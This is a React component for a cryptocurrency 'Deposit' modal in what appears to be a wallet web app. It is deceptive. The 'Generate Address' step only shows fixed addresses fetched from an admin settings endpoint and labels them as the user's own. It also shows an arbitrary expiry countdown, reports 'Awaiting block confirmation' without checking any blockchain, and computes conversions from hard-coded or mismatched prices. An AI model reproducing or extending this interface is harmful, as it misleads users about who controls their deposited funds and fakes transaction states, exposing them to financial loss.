'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, Copy, Check, ArrowRight, Loader2, Info, Clock, ChevronLeft } from 'lucide-react';
import { QRCodeCanvas } from 'qrcode.react';
import { useWallet } from '@/context/base';
import { motion, AnimatePresence } from 'framer-motion';

interface ReceiveModalProps {
    isOpen: boolean;
    onClose: () => void;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    isInline?: boolean;
}

type Step = 'setup' | 'display';

export default function ReceiveModal({
    isOpen,
    onClose,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    isInline = false
}: ReceiveModalProps) {
    const [step, setStep] = useState<Step>('setup');
    const [amount, setAmount] = useState('');
    const [selectedNetwork, setSelectedNetwork] = useState<string>('BNB');
    const [selectedCoin, setSelectedCoin] = useState('BNB');
    const [isCopied, setIsCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds
    const [expiresAt, setExpiresAt] = useState<number | null>(null);
    const [isPending, setIsPending] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [t22Price, setT22Price] = useState<number>(0.45);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const { address: userAddress } = useWallet();

    const networks = useMemo(() => ({
        BNB: {
            name: 'Smart Chain',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            symbol: 'BEP20',
            walletAddress: adminAddresses['bnb_address'] || ""
        },
        ETH: {
            name: 'Ethereum',
            icon: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            symbol: 'ERC20',
            walletAddress: adminAddresses['eth_address'] || ""
        },
        BTC: {
            name: 'Bitcoin',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            symbol: 'BTC',
            walletAddress: adminAddresses['btc_address'] || ""
        }
    }), [adminAddresses]);

    const availableCoins = useMemo(() => ({
        'BNB': {
            name: 'BNB', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            walletAddress: null, supportedNetworks: { "BNB": {} }
        },
        'ETH': {
            name: 'Ethereum', logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            walletAddress: null, supportedNetworks: { "ETH": {}, "BNB": {} }
        },
        'USDT': {
            name: 'Tether', logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'USDC': {
            name: 'USDC', logo: 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'BTC': {
            name: 'Bitcoin', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            walletAddress: adminAddresses['btc_address'] || "", supportedNetworks: { "BTC": {} }
        }
    }), [adminAddresses]);

    const activeDepositAddress = useMemo(() => {
        const coinData = availableCoins[selectedCoin as keyof typeof availableCoins];
        const networkData = networks[selectedNetwork as keyof typeof networks];

        if (!coinData) return networkData?.walletAddress || "";

        const networkConfig: any = coinData.supportedNetworks[selectedNetwork as keyof typeof coinData.supportedNetworks];

        if (networkConfig && 'address' in networkConfig && networkConfig.address) {
            return networkConfig.address;
        }

        if (coinData.walletAddress) {
            return coinData.walletAddress;
        }

        return networkData?.walletAddress || "";
    }, [selectedCoin, selectedNetwork]);

    const filteredAssets = useMemo(() => {
        return Object.entries(availableCoins)
            .filter(([_, data]) => Object.keys(data.supportedNetworks).includes(selectedNetwork))
            .map(([symbol]) => symbol);
    }, [selectedNetwork]);

    useEffect(() => {
        if (!filteredAssets.includes(selectedCoin)) {
            setSelectedCoin(filteredAssets[0] || '');
        }
    }, [selectedNetwork, filteredAssets]);

    const handleSubmit = async () => {
        try {
            setIsLoading(true);
            const response = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: userAddress,
                    amount: Number(amount),
                    type: "receive",
                    asset: selectedCoin,
                    network: selectedNetwork,
                    depositAddress: activeDepositAddress
                })
            });
            const vjson = await response.json();
            if (vjson?.record?.id) {
                setIsPending(true);
                setTimeout(() => onClose(), 2000);
            }
        } catch (e) {
            console.log(e);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (!isOpen) {
            setStep('setup');
            setAmount('');
            setIsPending(false);
            setTimeLeft(1800);
            setExpiresAt(null);
        } else {
            fetchPrice();
            fetchAdminSettings();
        }
    }, [isOpen]);

    const fetchAdminSettings = async () => {
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        }
    };

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    useEffect(() => {
        let timer: NodeJS.Timeout;
        if (step === 'display' && timeLeft > 0) {
            if (!expiresAt) setExpiresAt(Date.now() + timeLeft * 1000);
            timer = setInterval(() => {
                setTimeLeft((prev) => prev - 1);
            }, 1000);
        } else if (timeLeft === 0) {
            setStep('setup');
            setTimeLeft(1800);
            setExpiresAt(null);
        }
        return () => clearInterval(timer);
    }, [step, timeLeft, expiresAt]);

    const formatTime = (seconds: number) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    const handleCopy = () => {
        if (activeDepositAddress) {
            navigator.clipboard.writeText(activeDepositAddress);
            setIsCopied(true);
            setTimeout(() => setIsCopied(false), 2000);
        }
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[2.5rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-[#000000] border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-6 pb-10' : ''}`}>
                        <div className="flex items-center gap-4 mb-8">
                            <button onClick={onClose} className={`w-10 h-10 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                <ChevronLeft className="w-6 h-6" />
                            </button>
                            <h2 className="text-2xl font-black uppercase tracking-widest">{step === 'setup' ? 'Deposit' : 'Address Details'}</h2>
                        </div>

                        {step === 'setup' ? (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="space-y-6"
                            >
                                <div>
                                    <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-3">Choose Network Type</label>
                                    <div className="flex flex-wrap gap-2">
                                        {(Object.keys(networks) as Array<keyof typeof networks>).map((net) => (
                                            <button
                                                key={net}
                                                onClick={() => setSelectedNetwork(net)}
                                                className={`flex-1 min-w-[100px] py-4 px-3 rounded-2xl flex flex-col items-center justify-center gap-3 border text-[10px] font-black uppercase tracking-widest transition-all ${selectedNetwork === net
                                                        ? `border-[#3375BB] bg-[#3375BB]/10 ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-[#121212] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}
                                            >
                                                <img src={networks[net].icon} alt={net} className="w-7 h-7 object-contain" />
                                                <div className="text-center">
                                                    <p className="text-[10px] font-black tracking-widest">{networks[net].name}</p>
                                                    <p className="text-[9px] opacity-40 font-black">{networks[net].symbol}</p>
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-3">Select Asset</label>
                                    <div className="flex flex-wrap gap-2">
                                        {filteredAssets.map((coin) => (
                                            <button
                                                key={coin}
                                                onClick={() => setSelectedCoin(coin)}
                                                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl border transition-all text-[11px] font-black ${selectedCoin === coin
                                                        ? `border-[#3375BB] bg-[#3375BB]/10 ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-[#121212] text-gray-500 hover:bg-white/5 hover:!text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:!text-black'}`}`}
                                            >
                                                <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-5 h-5 object-contain rounded-full bg-white/10" />
                                                {availableCoins[coin as keyof typeof availableCoins]?.name || coin}
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-[10px] font-black uppercase tracking-widest text-gray-400 mb-2">Enter Amount</label>
                                    <div className="relative">
                                        <input
                                            type="number"
                                            value={amount}
                                            onChange={(e) => setAmount(e.target.value)}
                                            placeholder="0.00"
                                            className={`w-full px-5 py-5 border rounded-2xl focus:border-[#3375BB] focus:outline-none pr-24 text-xl font-black placeholder-gray-600 ${theme === 'dark' ? 'bg-[#121212] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                                }`}
                                        />
                                        <span className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 font-black text-sm uppercase tracking-widest">{selectedCoin}</span>
                                    </div>

                                    {amount && Number(amount) > 0 && (
                                        <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className={`border rounded-[2rem] p-5 space-y-3 text-sm mt-6 ${theme === 'dark' ? 'bg-[#1E2025]/50 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                            {(() => {
                                                const feeMap: Record<string, number> = { 'BNB': 0.15, 'ETH': 2.50, 'USDT': 1.00, 'BTC': 1.50 };
                                                const networkFee = feeMap[selectedCoin] || 0.00;
                                                const coinPrice = selectedCoin === 'BNB' ? 620 : selectedCoin === 'USDT' ? 1 : t22Price;
                                                const totalUsd = Number(amount) * coinPrice;
                                                const receivedUsd = Math.max(0, totalUsd - networkFee);
                                                const receivedCrypto = receivedUsd / coinPrice;

                                                return (
                                                    <>
                                                        <div className="flex justify-between items-center text-gray-400">
                                                            <span className="text-[10px] font-black uppercase tracking-widest">Conversion Rate</span>
                                                            <span className={`font-black text-[11px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>1 {selectedCoin} = {currencySymbol}{(coinPrice * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className="flex justify-between items-center text-gray-400">
                                                            <span className="text-[10px] font-black uppercase tracking-widest">Network Fee</span>
                                                            <span className={`font-black text-[11px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>~{currencySymbol}{(networkFee * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className={`h-[1px] w-full my-2 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                                        <div className="flex justify-between items-center">
                                                            <span className="text-gray-300 font-black uppercase tracking-widest text-[11px]">You will receive</span>
                                                            <div className="text-right">
                                                                <span className="text-[#3375BB] font-black text-lg block leading-none">
                                                                    {currencySymbol}{(receivedUsd * fxRate).toFixed(2)}
                                                                </span>
                                                                <span className="text-gray-500 font-black text-[10px] uppercase tracking-widest">
                                                                    {receivedCrypto.toFixed(6)} {selectedCoin}
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </>
                                                )
                                            })()}
                                        </motion.div>
                                    )}
                                </div>

                                <button
                                    onClick={() => setStep('display')}
                                    disabled={!amount || Number(amount) <= 0}
                                    className="w-full bg-[#3375BB] hover:bg-[#004ada] !text-white font-black uppercase tracking-widest py-5 rounded-[1.5rem] transition-all flex items-center justify-center gap-3 shadow-xl hover:shadow-[#3375BB]/25 active:scale-[0.98] text-[12px]"
                                >
                                    Generate Address <ArrowRight className="w-5 h-5" />
                                </button>
                            </motion.div>
                        ) : (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="flex flex-col items-center space-y-8"
                            >
                                <motion.div
                                    initial={{ scale: 0.9, opacity: 0 }}
                                    animate={{ scale: 1, opacity: 1 }}
                                    className="bg-white p-6 rounded-[3rem] shadow-2xl"
                                >
                                    {activeDepositAddress ? (
                                        <QRCodeCanvas
                                            value={activeDepositAddress}
                                            size={180}
                                            level={"H"}
                                            imageSettings={{
                                                src: availableCoins[selectedCoin as keyof typeof availableCoins]?.logo || networks[selectedNetwork as keyof typeof networks]?.icon,
                                                height: 44,
                                                width: 44,
                                                excavate: true,
                                            }}
                                        />
                                    ) : (
                                        <div className="w-[180px] h-[180px] flex items-center justify-center bg-gray-100 rounded-3xl">
                                            <span className="text-gray-400 text-[10px] font-black uppercase tracking-widest opacity-40">No QR Code</span>
                                        </div>
                                    )}
                                </motion.div>

                                <div className="w-full space-y-3">
                                    <p className="text-[10px] uppercase font-black text-gray-500 text-center tracking-widest opacity-40">
                                        Your {selectedCoin} ({networks[selectedNetwork].symbol}) Address
                                    </p>
                                    <div
                                        onClick={activeDepositAddress ? handleCopy : undefined}
                                        className={`group flex items-center justify-between w-full p-5 border rounded-2xl transition-all ${activeDepositAddress
                                                ? 'cursor-pointer hover:border-[#3375BB]/40 active:bg-white/5'
                                                : 'cursor-default opacity-50'
                                            } ${theme === 'dark' ? 'bg-[#1E2025] border-white/5' : 'bg-gray-100 border-gray-200 shadow-inner'}`}
                                    >
                                        <span className={`text-xs font-mono mr-2 tracking-wide uppercase font-black ${theme === 'dark' ? 'text-gray-300' : 'text-[#0a0b0d]'}`}>
                                            {activeDepositAddress ? (activeDepositAddress.length > 20
                                                ? `${activeDepositAddress.slice(0, 10)}........${activeDepositAddress.slice(-12)}`
                                                : activeDepositAddress) : "no wallet address"}
                                        </span>
                                        {activeDepositAddress && (isCopied ? <Check className="w-5 h-5 text-green-500" /> : <Copy className={`w-5 h-5 text-gray-500 group-hover:text-[#3375BB]`} />)}
                                    </div>

                                    <div className="flex flex-col items-center justify-center gap-1.5 mt-6 text-[#3375BB] bg-[#3375BB]/10 py-4 px-6 rounded-2xl border border-[#3375BB]/20">
                                        <div className="flex items-center gap-2.5">
                                            <Clock className="w-5 h-5 shrink-0 opacity-40" />
                                            <span className="text-[11px] font-black uppercase tracking-[0.1em]">
                                                Address expires in <span className="font-mono text-sm ml-1">{formatTime(timeLeft)}</span>
                                            </span>
                                        </div>
                                        <span className="text-[9px] text-[#0052FF]/70 font-black uppercase tracking-widest opacity-40">
                                            Expires on {expiresAt ? new Date(expiresAt).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' }) : ''}
                                        </span>
                                    </div>
                                </div>

                                <div className="w-full space-y-4">
                                    {!isPending ? (
                                        <button
                                            disabled={isLoading}
                                            onClick={() => handleSubmit()}
                                            className={`w-full py-5 rounded-[1.5rem] font-black uppercase tracking-widest text-[11px] transition-all disabled:opacity-50 ${
                                                theme === 'dark' 
                                                ? 'bg-white text-black hover:bg-gray-200' 
                                                : 'bg-[#0a0b0d] text-white hover:bg-black'
                                            } shadow-xl active:scale-[0.98]`}
                                        >
                                            {isLoading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : "I have made payment"}
                                        </button>
                                    ) : (
                                        <div className="w-full py-5 bg-yellow-500/10 border border-yellow-500/20 rounded-[1.5rem] flex flex-col items-center justify-center gap-1.5">
                                            <div className="flex items-center gap-2.5 text-yellow-500 font-black text-xs uppercase tracking-widest animate-pulse">
                                                <Loader2 className="w-5 h-5 animate-spin" />
                                                <span>Confirming...</span>
                                            </div>
                                            <p className="text-[9px] font-black uppercase tracking-widest text-yellow-500/40">Awaiting block confirmation</p>
                                        </div>
                                    )}
                                </div>

                                <div className="flex items-start gap-3 p-4 bg-red-500/5 rounded-2xl border border-red-500/10">
                                    <Info className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                                    <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest leading-relaxed">
                                        This address only accepts <span className="text-white font-black">{selectedCoin}</span> sent via the <span className="text-white font-black">{networks[selectedNetwork].name} ({networks[selectedNetwork].symbol})</span>.
                                    </p>
                                </div>
                            </motion.div>
                        )}
                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return renderContent();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-6 shadow-2xl pb-10 md:pb-6 md:m-4`}
                    >
                        {renderContent()}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}